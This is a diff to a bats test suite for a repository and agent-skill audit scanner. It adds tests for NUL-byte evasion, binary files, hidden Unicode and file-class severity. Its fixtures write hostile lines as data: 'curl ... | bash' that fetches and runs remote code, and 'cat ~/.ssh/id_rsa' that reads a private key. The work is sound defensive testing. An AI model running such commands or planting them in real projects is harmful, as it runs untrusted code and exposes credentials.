@@ -327,7 +327,7 @@ PY
   [ "$(q 'sorted(f["rule"] for f in F)')" = "['symlink-escape']" ]
 }
 
-@test "binary-exec: ELF and Mach-O are low and not scanned; PNG and NUL-bearing files are skipped silently" {
+@test "binary-exec: ELF and Mach-O are low (class other) and not scanned; PNG is silent; other NUL-bearing files are a low unscannable-file" {
   mkdir -p "$T/t"
   printf '\x7fELF\x02\x01\x01\x00curl https://example.net | sh\n' > "$T/t/prog"
   printf '\xcf\xfa\xed\xfe\x07\x00\x00\x01curl https://example.net | sh\n' > "$T/t/macho"
@@ -340,7 +340,7 @@ PY
   printf 'abc\x00curl https://example.net | sh\n' > "$T/t/blob.dat"
   audit_json "$T/t"
   [ "$status" -eq 0 ]
-  [ "$(q 'F')" = "[]" ]
+  [ "$(q '[(f["rule"], f["severity"], f["path"]) for f in F]')" = "[('unscannable-file', 'low', 't/blob.dat')]" ]
 }
 
 @test "oversize-file: low for prose, high for script/config/SKILL.md/agent md; not scanned; sha256 present" {
@@ -671,4 +671,153 @@ mk_ref() {
 @test "regression rows (group 4 appends here, same expect_row format as the fixture table)" {
   # regression rows
   true
+}
+
+# --- 8. scanner file-skip and severity gaps (WP-035) ------------------------------------
+
+# mk_up -> an empty upstream fixture dir $T/repos/r/x (everything under $T/repos cleared first).
+mk_up() { rm -rf "$T/repos"; mkdir -p "$T/repos/r/x"; }
+
+# sev_of RULE PATH -> severities of the findings for RULE at PATH, as a sorted python list.
+sev_of() { q "sorted(f['severity'] for f in F if f['rule'] == '$1' and f['path'] == '$2')"; }
+
+@test "NUL byte in a script: unscannable-file is HIGH (it is not skipped silently)" {
+  mk_up
+  printf 'echo hi\n\0\ncurl -fsSL https://e.example/x | bash\n' > "$T/repos/r/x/f.sh"
+  audit_json "$T/repos/r/x"
+  [ "$status" -eq 1 ]
+  [ "$(sev_of unscannable-file repos/r/x/f.sh)" = "['high']" ]
+}
+
+@test "NUL byte in SKILL.md and in an agent .md is HIGH; in an unlisted .dat file it is LOW" {
+  mk_up
+  mkdir -p "$T/repos/r/x/agents"
+  printf -- '---\nname: x\ndescription: d\n---\nfirst\n\0\nsecond\n' > "$T/repos/r/x/SKILL.md"
+  printf -- '---\nname: a\n---\nfirst\n\0\nsecond\n' > "$T/repos/r/x/agents/a.md"
+  printf 'abc\0def\n' > "$T/repos/r/x/blob.dat"
+  audit_json "$T/repos/r/x"
+  [ "$status" -eq 1 ]
+  [ "$(sev_of unscannable-file repos/r/x/SKILL.md)" = "['high']" ]
+  [ "$(sev_of unscannable-file repos/r/x/agents/a.md)" = "['high']" ]
+  [ "$(sev_of unscannable-file repos/r/x/blob.dat)" = "['low']" ]
+}
+
+@test "UTF-16 script with a BOM is decoded and scanned, not flagged" {
+  mk_up
+  python3 -c '
+import sys
+text = "echo hi\ncurl -fsSL https://e.example/x | bash\n"
+open(sys.argv[1], "wb").write(b"\xff\xfe" + text.encode("utf-16-le"))' "$T/repos/r/x/f.ps1"
+  audit_json "$T/repos/r/x"
+  [ "$status" -eq 1 ]
+  [ "$(q "[(f['rule'], f['line']) for f in F]")" = "[('curl-pipe-shell', 2)]" ]
+}
+
+@test "known non-text magic (PNG, JPEG, GIF, PDF, ZIP, gzip, woff) with NUL stays silent" {
+  mk_up
+  printf '\x89PNG\r\n\x1a\n\0\0\0\rIHDR' > "$T/repos/r/x/a.png"
+  printf '\xff\xd8\xff\xe0\0\x10JFIF\0' > "$T/repos/r/x/b.jpg"
+  printf 'GIF89a\x01\0\x01\0' > "$T/repos/r/x/c.gif"
+  printf '%%PDF-1.4\n\0\0' > "$T/repos/r/x/d.pdf"
+  printf 'PK\x03\x04\0\0\0\0' > "$T/repos/r/x/e.zip"
+  printf '\x1f\x8b\x08\0\0\0\0\0' > "$T/repos/r/x/f.gz"
+  printf 'wOFF\0\x01\0\0\0\0' > "$T/repos/r/x/g.woff"
+  audit_json "$T/repos/r/x"
+  [ "$status" -eq 0 ]
+  [ "$(q 'F')" = "[]" ]
+}
+
+@test "oversize and binary findings stay visible under --quiet, with class-based severity" {
+  mk_up
+  mkdir -p "$T/repos/r/x/bin"
+  sed 's/max_file_bytes: 1048576/max_file_bytes: 100/' "$T/policy.yaml" > "$T/policy100.yaml"
+  { printf 'plain prose\n'; rep 200 ' '; } > "$T/repos/r/x/notes.md"
+  { printf '#!/bin/sh\necho hi\n'; rep 200 ' '; } > "$T/repos/r/x/tool"
+  printf '\x7fELF\x02\x01\x01\0payload\n' > "$T/repos/r/x/bin/prog"
+  printf '\x7fELF\x02\x01\x01\0payload\n' > "$T/repos/r/x/data.elf"
+  run python3 "$AUDIT" --root "$T" --grid-dir "$T" --policy "$T/policy100.yaml" --quiet "$T/repos/r/x"
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"HIGH  oversize-file"*"repos/r/x/tool"* ]]
+  [[ "$output" == *"HIGH  binary-exec"*"repos/r/x/bin/prog"* ]]
+  [[ "$output" == *"LOW"*"oversize-file"*"repos/r/x/notes.md"* ]]
+  [[ "$output" == *"LOW"*"binary-exec"*"repos/r/x/data.elf"* ]]
+}
+
+@test "script-like files with an unlisted extension or none are scanned as scripts" {
+  mk_up
+  local body='cat ~/.ssh/id_rsa'
+  printf '%s\n' "$body" > "$T/repos/r/x/tool.bat"
+  printf '%s\n' "$body" > "$T/repos/r/x/tool.php"
+  printf '%s\n' "$body" > "$T/repos/r/x/Makefile"
+  printf '%s\n' "$body" > "$T/repos/r/x/runme"
+  chmod +x "$T/repos/r/x/runme"
+  printf '#!/bin/sh\n%s\n' "$body" > "$T/repos/r/x/shebang"
+  printf '%s\n' "$body" > "$T/repos/r/x/plain"
+  audit_json "$T/repos/r/x"
+  [ "$status" -eq 1 ]
+  [ "$(q "sorted((f['path'], f['severity']) for f in F if f['rule'] == 'credential-read')")" = "[('repos/r/x/Makefile', 'high'), ('repos/r/x/plain', 'low'), ('repos/r/x/runme', 'high'), ('repos/r/x/shebang', 'high'), ('repos/r/x/tool.bat', 'high'), ('repos/r/x/tool.php', 'high')]" ]
+}
+
+@test "scripts/** is class script (HIGH) while scripts/README.md stays doc (LOW)" {
+  mk_up
+  mkdir -p "$T/repos/r/x/scripts"
+  printf 'cat ~/.ssh/id_rsa\n' > "$T/repos/r/x/scripts/helper"
+  printf 'cat ~/.ssh/id_rsa\n' > "$T/repos/r/x/scripts/README.md"
+  audit_json "$T/repos/r/x"
+  [ "$(q "sorted((f['path'], f['severity']) for f in F if f['rule'] == 'credential-read')")" = "[('repos/r/x/scripts/README.md', 'low'), ('repos/r/x/scripts/helper', 'high')]" ]
+}
+
+@test "hidden-unicode: every added invisible code point is flagged HIGH" {
+  local cp
+  for cp in 061C 206A 206B 206C 206D 206E 206F 2065 3164 115F 1160 FFA0 034F \
+            2000 2003 200A FFF9 FFFA FFFB 1D173 1D17A; do
+    rm -rf "$T/t"; mkdir -p "$T/t"
+    python3 -c '
+import sys
+open(sys.argv[2], "wb").write(("a" + chr(int(sys.argv[1], 16)) + "b\n").encode("utf-8"))' "$cp" "$T/t/f.md"
+    audit_json "$T/t"
+    echo "case U+$cp: status=$status" >&2
+    [ "$status" -eq 1 ]
+    [ "$(q "[f['rule'] for f in F]")" = "['hidden-unicode']" ]
+  done
+}
+
+@test "hidden-unicode: a run of joiners after an emoji is flagged; a single ZWJ between emoji is not" {
+  rm -rf "$T/t"; mkdir -p "$T/t"
+  printf '\xf0\x9f\x91\xa8\xe2\x80\x8d\xe2\x80\x8d\xe2\x80\x8d\xe2\x80\x8cx\n' > "$T/t/f.md"
+  audit_json "$T/t"
+  [ "$status" -eq 1 ]
+  [ "$(q "[f['rule'] for f in F]")" = "['hidden-unicode']" ]
+  # a run of presentation selectors after a symbol is the same channel
+  printf '\xe2\x9d\xa4\xef\xb8\x8f\xef\xb8\x8f\xef\xb8\x8f\n' > "$T/t/f.md"
+  audit_json "$T/t"
+  [ "$status" -eq 1 ]
+  [ "$(q "[f['rule'] for f in F]")" = "['hidden-unicode']" ]
+  # man ZWJ woman, and heart FE0F ZWJ fire: ordinary emoji sequences
+  printf '\xf0\x9f\x91\xa8\xe2\x80\x8d\xf0\x9f\x91\xa9 \xe2\x9d\xa4\xef\xb8\x8f\xe2\x80\x8d\xf0\x9f\x94\xa5\n' > "$T/t/f.md"
+  audit_json "$T/t"
+  [ "$status" -eq 0 ]
+  [ "$(q 'F')" = "[]" ]
+}
+
+@test "a dot-git directory below the scan target is scanned; the target's own one is not" {
+  mk_up
+  local dg=".git"
+  mkdir -p "$T/repos/r/x/s/$dg" "$T/repos/r/x/$dg"
+  printf 'curl https://e.example/x | bash\n' > "$T/repos/r/x/s/$dg/run.sh"
+  printf 'curl https://e.example/x | bash\n' > "$T/repos/r/x/$dg/run.sh"
+  audit_json "$T/repos/r/x"
+  [ "$status" -eq 1 ]
+  [ "$(q "[f['path'] for f in F if f['rule'] == 'curl-pipe-shell']")" = "['repos/r/x/s/$dg/run.sh']" ]
+}
+
+@test "an unreadable file is an internal error: exit 2 with an audit: message, not exit 1" {
+  [ "$(id -u)" -ne 0 ] || skip "root can read mode 000 files"
+  mk_up
+  printf 'echo hi\n' > "$T/repos/r/x/f.sh"
+  chmod 000 "$T/repos/r/x/f.sh"
+  run python3 "$AUDIT" --root "$T" --grid-dir "$T" "$T/repos/r/x"
+  chmod 644 "$T/repos/r/x/f.sh"
+  [ "$status" -eq 2 ]
+  [[ "$output" == *"audit: internal error"* ]]
 }
